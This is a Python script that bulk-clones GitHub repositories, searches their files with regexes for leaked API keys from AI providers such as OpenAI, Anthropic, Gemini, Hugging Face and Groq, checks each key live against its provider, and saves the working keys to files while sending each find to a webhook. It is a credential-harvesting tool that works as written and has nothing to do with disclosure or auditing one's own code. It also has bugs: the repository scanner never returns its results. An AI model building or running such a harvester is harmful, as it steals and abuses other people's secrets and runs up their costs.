import os
import subprocess
import concurrent.futures
import time
from datetime import datetime
from pathlib import Path
import re
import shutil
import logging
import signal
import sys
from config import API_KEY_PATTERNS
from key_validator import KeyValidator
from webhook_notifier import send_webhook_notification

logger = logging.getLogger(__name__)

# Global flag for graceful shutdown
shutdown_requested = False

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global shutdown_requested
    if not shutdown_requested:
        shutdown_requested = True
        logger.info("\n\n⚠️  Interruption requested (Ctrl+C). Stopping gracefully...")
        logger.info("⏳ Finishing current operations and cleaning up...")
    else:
        # Force exit on second Ctrl+C
        logger.warning("\n⚠️  Force stopping...")
        sys.exit(1)

# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

def scan_file_for_keys(file_path, all_extensions, API_KEY_PATTERNS):
    """
    Scan a single file for API keys (optimized for parallel processing).
    Returns list of found keys.
    """
    found_keys = []
    file_ext = Path(file_path).suffix.lower()
    
    # Only scan relevant file types
    if file_ext not in all_extensions and not file_ext == '':
        return found_keys
    
    try:
        # Check file size BEFORE reading to avoid loading large files into memory
        file_size = os.path.getsize(file_path)
        
        # Skip files over 1 MB (1,048,576 bytes)
        if file_size > 1024 * 1024:
            return found_keys
        
        # Skip files over 1 GB (1,073,741,824 bytes) - redundant check but explicit
        if file_size > 1024 * 1024 * 1024:
            return found_keys
        
        # Read file content with optimized buffer size
        with open(file_path, 'r', encoding='utf-8', errors='ignore', buffering=8192) as f:
            content = f.read()
                    
        # Check each API key pattern
        for key_type, patterns in API_KEY_PATTERNS.items():
            for pattern in patterns:
                matches = pattern.finditer(content)
                for match in matches:
                    # Extract key: use capture group if present, otherwise use full match
                    if match.groups():
                        key = match.group(1)  # Use captured group
                    else:
                        key = match.group(0)  # Use full match
                    
                    # Clean up key: remove quotes if present
                    if key:
                        key = key.strip('"\'')
                    
                    # Only add if it's a valid key and not already found
                    if key and key not in [k['key'] for k in found_keys]:
                        # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
                        if key.lower().startswith(('sha', 'md5', 'base64')):
                            continue
                        
                        # Validate the key matches the expected format for this type
                        # Skip Pinecone keys that are just UUIDs without context
                        if key_type == 'pinecone':
                            # Only save if it was found in a context pattern (has capture group)
                            if not match.groups():
                                continue  # Skip standalone UUIDs
                        
                        # Skip Cohere keys that don't have context
                        if key_type == 'cohere':
                            if not match.groups():
                                continue  # Skip standalone 40-char strings
                        
                        # Validate key length based on type
                        key_clean = key.strip('"\'').strip()
                        valid_length = False
                        
                        if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
                            valid_length = True
                        elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
                            valid_length = True
                        elif key_type == 'anthropic' and (key_clean.startswith('sk-ant-') or key_clean.startswith('sk-ant-api03-')):
                            valid_length = True
                        elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
                            valid_length = True
                        elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
                            valid_length = True
                        elif key_type == 'cohere' and len(key_clean) == 40:
                            valid_length = True
                        elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
                            valid_length = True
                        elif key_type == 'perplexity' and key_clean.startswith('pplx-'):
                            valid_length = True
                        elif key_type == 'mistral' and len(key_clean) >= 32:
                            valid_length = True
                        elif key_type == 'groq' and key_clean.startswith('gsk_'):
                            valid_length = True
                        
                        if valid_length:
                            found_keys.append({
                                'key': key_clean,
                                'type': key_type,
                                'file': file_path,
                                'line': content[:match.start()].count('\n') + 1
                            })
    except Exception:
        pass
    
    return found_keys

def scan_repo_for_keys(repo_path):
    """
    Scan a downloaded repository for API keys (optimized for high-performance setup).
    Uses parallel file scanning for large repos.
    Returns list of found keys with their types.
    """
    found_keys = []
    
    # File extensions to scan (code files and config files)
    code_extensions = {'.py', '.js', '.ts', '.java', '.go', '.rs', '.cpp', '.c', '.php', '.rb', '.swift', '.kt'}
    config_extensions = {'.env', '.yaml', '.yml', '.json', '.toml', '.ini', '.conf', '.config'}
    text_extensions = {'.txt', '.md', '.sh', '.bat', '.ps1'}
    
    all_extensions = code_extensions | config_extensions | text_extensions
    
    # Collect all files to scan
    files_to_scan = []
    try:
        for root, dirs, files in os.walk(repo_path):
            # Skip hidden directories and common ignore patterns
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in {'node_modules', '__pycache__', 'venv', '.git'}]
            
            for file in files:
                if file.startswith('.'):
                    continue
                    
                file_path = os.path.join(root, file)
                file_ext = Path(file_path).suffix.lower()
                
                # Only scan relevant file types
                if file_ext in all_extensions or file_ext == '':
                    files_to_scan.append(file_path)
    except Exception:
        return found_keys
    
    # For high-performance setup: scan files in parallel if repo is large
    if len(files_to_scan) > 50:
        # Use ThreadPoolExecutor for parallel file scanning
        import multiprocessing
        scan_workers = min(multiprocessing.cpu_count(), 32)  # Cap at 32 for file scanning
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=scan_workers) as executor:
            futures = {executor.submit(scan_file_for_keys, file_path, all_extensions, API_KEY_PATTERNS): file_path 
                      for file_path in files_to_scan}
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    file_keys = future.result()
                    found_keys.extend(file_keys)
                except Exception:
                    continue
    else:
        # Small repo: scan sequentially (faster for small repos)
        for file_path in files_to_scan:
            try:
                file_keys = scan_file_for_keys(file_path, all_extensions, API_KEY_PATTERNS)
                found_keys.extend(file_keys)
            except Exception:
                continue

def download_and_scan_repo(url):
    """
    Downloads one repository and scans it for API keys.
    Returns result message, found keys, and timing statistics.
    No retries - single attempt with 2 second timeout.
    """
    global shutdown_requested
    
    # Check if shutdown was requested
    if shutdown_requested:
        return f"⏭️  Skipped (shutdown requested): {url.split('/')[-1]}", [], {}
    
    timings = {
        'total': 0,
        'download': 0,
        'scan': 0,
        'delete': 0,
        'validation': 0
    }
    
    start_time = time.time()
    
    # Create a folder name from the URL
    folder_name = url.split("github.com/")[1].replace(".git", "").replace("/", "_")
    output_path = os.path.join("downloaded_repos", folder_name)
    
    # Clean up any existing partial download
    if os.path.exists(output_path):
        try:
            shutil.rmtree(output_path)
        except Exception:
            pass
    
    # Download the repo with optimized timeout for high-performance setup
    download_start = time.time()
    # Timeout for git clone: 30 seconds should be enough even for large repos
    timeout_duration = 30.0  # 30 seconds max for git clone
    
    try:
        # Use fastest shallow clone strategy
        git_cmd = ["git", "clone", "--depth", "1", "--quiet", "--single-branch", url, output_path]
        
        try:
            subprocess.run(
                git_cmd,
                check=True,
                timeout=timeout_duration,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            timings['download'] = time.time() - download_start
            
        except subprocess.TimeoutExpired:
            # Clean up on timeout
            if os.path.exists(output_path):
                try:
                    shutil.rmtree(output_path)
                except Exception:
                    pass
            timings['total'] = time.time() - start_time
            timings['download'] = timeout_duration
            return f"⏱️  {timings['total']:.2f}s | ⬇️  {timings['download']:.2f}s (TIMEOUT) | ⏭️  Skipped: {folder_name}", [], timings
            
        except subprocess.CalledProcessError as e:
            # Check if it's a non-retryable error (repo not found, 404, etc.)
            error_output = e.stderr.decode('utf-8', errors='ignore') if e.stderr else ""
            stdout_output = e.stdout.decode('utf-8', errors='ignore') if e.stdout else ""
            full_error = (error_output + " " + stdout_output).lower()
            
            # Clean up on error
            if os.path.exists(output_path):
                try:
                    shutil.rmtree(output_path)
                except Exception:
                    pass
            
            timings['download'] = time.time() - download_start
            timings['total'] = time.time() - start_time
            
            # Check for non-retryable errors
            non_retryable_patterns = [
                'not found', '404', 'does not exist', 'repository not found',
                'resource not available', 'ressource not available',
                'resource unavailable', 'no such repository', 'repository does not exist'
            ]
            
            is_non_retryable = any(pattern in full_error for pattern in non_retryable_patterns)
            
            if is_non_retryable:
                return f"⏱️  {timings['total']:.2f}s | ⬇️  {timings['download']:.2f}s | ⚠️  Skipped (not found/404): {folder_name}", [], timings
            else:
                return f"⏱️  {timings['total']:.2f}s | ⬇️  {timings['download']:.2f}s | ❌ Failed: {folder_name} ({error_output[:30]})", [], timings
        
        # Successfully downloaded, now scan
        scan_start = time.time()
        found_keys = scan_repo_for_keys(output_path)
        timings['scan'] = time.time() - scan_start
        
        # Delete repo immediately after scanning
        delete_start = time.time()
        try:
            shutil.rmtree(output_path)
            timings['delete'] = time.time() - delete_start
        except Exception as e:
            timings['delete'] = time.time() - delete_start
            logger.debug(f"Warning: Could not delete {output_path}: {e}")
        
        timings['total'] = time.time() - start_time
        
        timings['total'] = time.time() - start_time
        
        if found_keys:
            return f"⏱️  {timings['total']:.2f}s | ⬇️  {timings['download']:.2f}s | 🔍 {timings['scan']:.2f}s | 🗑️  {timings['delete']:.2f}s | ✅ {folder_name} | 🔑 {len(found_keys)} keys", found_keys, timings
        return f"⏱️  {timings['total']:.2f}s | ⬇️  {timings['download']:.2f}s | 🔍 {timings['scan']:.2f}s | 🗑️  {timings['delete']:.2f}s | ✅ {folder_name}", [], timings
        
    except Exception as e:
        # Clean up on error
        if os.path.exists(output_path):
            try:
                shutil.rmtree(output_path)
            except Exception:
                pass
        
        timings['total'] = time.time() - start_time
        timings['download'] = time.time() - download_start if 'download_start' in locals() else 0
        return f"⏱️  {timings['total']:.2f}s | ❌ Error: {folder_name} ({str(e)[:30]})", [], timings

def save_key(key_data, key_type, is_working=False):
    """
    Save found API key to file immediately with company name.
    Format: <COMPANY> | <KEY>
    """
    filename = "working_api_keys.txt" if is_working else "found_api_keys.txt"
    key = key_data['key']
    
    # Get company name
    try:
        from webhook_notifier import get_company_name
        company_name = get_company_name(key_type)
    except:
        company_name = key_type.replace("_", " ").title()
    
    # Save with company name: COMPANY | KEY
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{company_name} | {key}\n")
        f.flush()
    
    # Track key in current run if app is available
    try:
        import key_tracker
        key_tracker.track_key(key)
    except:
        pass  # Silently fail if tracking not available

def bulk_downloader():
    """
    Main function: Download repos and scan for API keys.
    Collects timing statistics and displays performance analysis.
    """
    global shutdown_requested
    
    # Create output directory
    if not os.path.exists("downloaded_repos"):
        os.makedirs("downloaded_repos")
    
    # Initialize key files if they don't exist
    if not os.path.exists("found_api_keys.txt"):
        with open("found_api_keys.txt", "w") as f:
            pass  # Create empty file
    if not os.path.exists("working_api_keys.txt"):
        with open("working_api_keys.txt", "w") as f:
            pass  # Create empty file
    
    # Initialize key validator
    validator = KeyValidator()
    
    # Read repo URLs
    if not os.path.exists("repo_list.txt"):
        logger.error("❌ Error: repo_list.txt not found. Run big.py first!")
        return
    
    with open("repo_list.txt", "r") as f:
        urls = [line.strip() for line in f if line.strip()]
    
    total_repos = len(urls)
    
    # Auto-detect optimal worker count based on CPU cores
    import multiprocessing
    cpu_count = multiprocessing.cpu_count()
    # For high-performance setup: use 2x CPU cores (optimal for I/O-bound tasks)
    # Cap at 150 to avoid overwhelming the system
    optimal_workers = min(cpu_count * 2, 150)
    
    logger.info(f"🚀 Starting download and scan of {total_repos} repositories...")
    logger.info(f"💻 Detected {cpu_count} CPU cores - Using {optimal_workers} parallel workers")
    logger.info(f"⏱️  Timeout: 30 seconds per repo (allows proper git clone)")
    logger.info(f"🗑️  Repositories will be deleted after scanning to save disk space")
    logger.info(f"⏱️  Timing format: Total | Download | Scan | Delete | Status")
    logger.info(f"{'='*80}")
    
    start_time = time.time()
    completed = 0
    total_keys_found = 0
    total_working_keys = 0
    
    # Track timing statistics
    timing_stats = {
        'download': [],
        'scan': [],
        'delete': [],
        'validation': [],
        'total': []
    }
    
    skipped_count = 0
    failed_count = 0
    timeout_count = 0
    
    # Process repos in batches of 100
    batch_size = 100
    total_batches = (total_repos + batch_size - 1) // batch_size
    
    logger.info(f"📦 Processing {total_repos} repos in {total_batches} batches of {batch_size}")
    logger.info(f"🔄 Each batch: Clone → Crawl → Delete\n")
    
    # Use optimal worker count for high-performance setup (but limit to batch size)
    batch_workers = min(optimal_workers, batch_size)
    
    try:
        for batch_num in range(total_batches):
            if shutdown_requested:
                logger.info("\n⚠️  Shutdown requested. Stopping batch processing...")
                break
            
            batch_start = batch_num * batch_size
            batch_end = min(batch_start + batch_size, total_repos)
            batch_urls = urls[batch_start:batch_end]
            
            logger.info(f"\n{'='*80}")
            logger.info(f"📦 BATCH {batch_num + 1}/{total_batches}: Processing repos {batch_start + 1}-{batch_end} ({len(batch_urls)} repos)")
            logger.info(f"{'='*80}")
            
            batch_start_time = time.time()
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=batch_workers) as executor:
                # Submit all tasks for this batch
                future_to_url = {executor.submit(download_and_scan_repo, url): url for url in batch_urls}
                
                # Process results as they complete
                batch_completed = 0
                
                for future in concurrent.futures.as_completed(future_to_url):
                    # Check for shutdown request
                    if shutdown_requested:
                        logger.info("\n⚠️  Shutdown requested. Finishing current batch and stopping...")
                        break
                    
                    batch_completed += 1
                    completed += 1
                    url = future_to_url[future]
                    
                    try:
                        result_msg, found_keys, timings = future.result()
                            
                    except Exception as e:
                        if shutdown_requested:
                            # If shutdown was requested, just skip error logging
                            continue
                        logger.error(f"❌ Exception processing {url}: {e}")
                        failed_count += 1
                        continue
                    
                    # Process results even if shutdown was requested (to save any found keys)
                    
                    # Collect timing statistics
                    if timings:
                        timing_stats['download'].append(timings.get('download', 0))
                        timing_stats['scan'].append(timings.get('scan', 0))
                        timing_stats['delete'].append(timings.get('delete', 0))
                        timing_stats['total'].append(timings.get('total', 0))
                    
                    # Track status
                    if "TIMEOUT" in result_msg:
                        timeout_count += 1
                    elif "Skipped" in result_msg:
                        skipped_count += 1
                    elif "❌ Failed" in result_msg:
                        failed_count += 1
                    
                    logger.info(result_msg)
                    
                    # Process found keys
                    validation_start = time.time()
                    for key_data in found_keys:
                        total_keys_found += 1
                        save_key(key_data, key_data['type'], is_working=False)
                        logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                        
                        # Send webhook notification immediately when key is found
                        try:
                            send_webhook_notification(key_data['key'], key_data['type'], "API key found", is_working=False)
                        except Exception as e:
                            logger.warning(f"Error sending webhook for found key: {e}")
                        
                        # Test if key is working
                        try:
                            is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
                            if is_valid:
                                total_working_keys += 1
                                save_key(key_data, key_data['type'], is_working=True)
                                logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
                                # Send webhook notification for working key
                                send_webhook_notification(key_data['key'], key_data['type'], message, is_working=True)
                            else:
                                logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
                        except Exception as e:
                            logger.warning(f"Error testing key: {e}")
                    
                    validation_time = time.time() - validation_start
                    if validation_time > 0:
                        timing_stats['validation'].append(validation_time)
                    
                    # Progress update every 10 repos
                    if completed % 10 == 0 and not shutdown_requested:
                        elapsed = time.time() - start_time
                        rate = completed / elapsed if elapsed > 0 else 0
                        remaining = (total_repos - completed) / rate if rate > 0 else 0
                        logger.info(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
                              f"Rate: {rate:.1f} repos/sec | "
                              f"ETA: {remaining:.0f}s | "
                              f"Keys: {total_keys_found} found, {total_working_keys} working | "
                              f"Skipped: {skipped_count} | Failed: {failed_count} | Timeout: {timeout_count}\n")
            
            # Batch completed - all repos in this batch have been cloned, crawled, and deleted
            batch_time = time.time() - batch_start_time
            logger.info(f"\n✅ BATCH {batch_num + 1}/{total_batches} COMPLETED in {batch_time:.2f}s")
            logger.info(f"   Processed: {batch_completed}/{len(batch_urls)} repos")
            logger.info(f"   All repos in this batch have been cloned, crawled, and deleted")
            logger.info(f"   Total progress: {completed}/{total_repos} repos ({100*completed/total_repos:.1f}%)")
            logger.info(f"   Keys found so far: {total_keys_found} | Working keys: {total_working_keys}\n")
                
    except KeyboardInterrupt:
        shutdown_requested = True
        logger.info("\n\n⚠️  Keyboard interrupt detected. Stopping...")
    except Exception as e:
        if not shutdown_requested:
            logger.error(f"❌ Unexpected error: {e}")
    
    # Clean up downloaded repos directory if shutdown was requested
    if shutdown_requested:
        logger.info("🧹 Cleaning up downloaded repositories...")
        try:
            if os.path.exists("downloaded_repos"):
                for item in os.listdir("downloaded_repos"):
                    item_path = os.path.join("downloaded_repos", item)
                    try:
                        if os.path.isdir(item_path):
                            shutil.rmtree(item_path)
                        else:
                            os.remove(item_path)
                    except Exception:
                        pass
        except Exception as e:
            logger.debug(f"Cleanup warning: {e}")
    
    # Calculate and display timing statistics
    total_time = time.time() - start_time
    
    logger.info(f"\n{'='*80}")
    if shutdown_requested:
        logger.info(f"⚠️  INTERRUPTED - PARTIAL RESULTS")
    else:
        logger.info(f"⏱️  TIMING STATISTICS & PERFORMANCE ANALYSIS")
    logger.info(f"{'='*80}")
    
    if timing_stats['download']:
        avg_download = sum(timing_stats['download']) / len(timing_stats['download'])
        max_download = max(timing_stats['download'])
        total_download = sum(timing_stats['download'])
        logger.info(f"⬇️  Download:")
        logger.info(f"   Average: {avg_download:.3f}s | Max: {max_download:.3f}s | Total: {total_download:.1f}s")
        logger.info(f"   Percentage of total time: {(total_download/total_time)*100:.1f}%")
    
    if timing_stats['scan']:
        avg_scan = sum(timing_stats['scan']) / len(timing_stats['scan'])
        max_scan = max(timing_stats['scan'])
        total_scan = sum(timing_stats['scan'])
        logger.info(f"🔍 Scan:")
        logger.info(f"   Average: {avg_scan:.3f}s | Max: {max_scan:.3f}s | Total: {total_scan:.1f}s")
        logger.info(f"   Percentage of total time: {(total_scan/total_time)*100:.1f}%")
    
    if timing_stats['delete']:
        avg_delete = sum(timing_stats['delete']) / len(timing_stats['delete'])
        max_delete = max(timing_stats['delete'])
        total_delete = sum(timing_stats['delete'])
        logger.info(f"🗑️  Delete:")
        logger.info(f"   Average: {avg_delete:.3f}s | Max: {max_delete:.3f}s | Total: {total_delete:.1f}s")
        logger.info(f"   Percentage of total time: {(total_delete/total_time)*100:.1f}%")
    
    if timing_stats['validation']:
        avg_validation = sum(timing_stats['validation']) / len(timing_stats['validation'])
        max_validation = max(timing_stats['validation'])
        total_validation = sum(timing_stats['validation'])
        logger.info(f"✅ Validation:")
        logger.info(f"   Average: {avg_validation:.3f}s | Max: {max_validation:.3f}s | Total: {total_validation:.1f}s")
        logger.info(f"   Percentage of total time: {(total_validation/total_time)*100:.1f}%")
    
    # Identify bottleneck
    logger.info(f"\n🔍 BOTTLENECK ANALYSIS:")
    percentages = {}
    if timing_stats['download']:
        percentages['Download'] = (sum(timing_stats['download'])/total_time)*100
    if timing_stats['scan']:
        percentages['Scan'] = (sum(timing_stats['scan'])/total_time)*100
    if timing_stats['delete']:
        percentages['Delete'] = (sum(timing_stats['delete'])/total_time)*100
    if timing_stats['validation']:
        percentages['Validation'] = (sum(timing_stats['validation'])/total_time)*100
    
    if percentages:
        sorted_percentages = sorted(percentages.items(), key=lambda x: x[1], reverse=True)
        logger.info(f"   🥇 Biggest bottleneck: {sorted_percentages[0][0]} ({sorted_percentages[0][1]:.1f}% of total time)")
        if len(sorted_percentages) > 1:
            logger.info(f"   🥈 Second: {sorted_percentages[1][0]} ({sorted_percentages[1][1]:.1f}% of total time)")
        if len(sorted_percentages) > 2:
            logger.info(f"   🥉 Third: {sorted_percentages[2][0]} ({sorted_percentages[2][1]:.1f}% of total time)")
    
    logger.info(f"\n{'='*80}")
    logger.info(f"📊 FINAL SUMMARY")
    logger.info(f"{'='*80}")
    if shutdown_requested:
        logger.info(f"⚠️  Program interrupted by user")
    logger.info(f"✅ Completed: {completed}/{total_repos} repositories")
    logger.info(f"⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
    if completed > 0:
        logger.info(f"📊 Average rate: {completed/total_time:.2f} repos/sec")
    logger.info(f"🔑 Keys found: {total_keys_found} total, {total_working_keys} working")
    logger.info(f"📈 Status breakdown:")
    logger.info(f"   ✅ Successful: {completed - skipped_count - failed_count - timeout_count}")
    logger.info(f"   ⚠️  Skipped (not found/404): {skipped_count}")
    logger.info(f"   ⏱️  Timeout (>1s): {timeout_count}")
    logger.info(f"   ❌ Failed: {failed_count}")
    logger.info(f"{'='*80}")
    print(f"💾 Results saved to: found_api_keys.txt and working_api_keys.txt")
    
    if shutdown_requested:
        logger.info("\n👋 Exiting gracefully...")
        sys.exit(0)

if __name__ == "__main__":
    bulk_downloader()
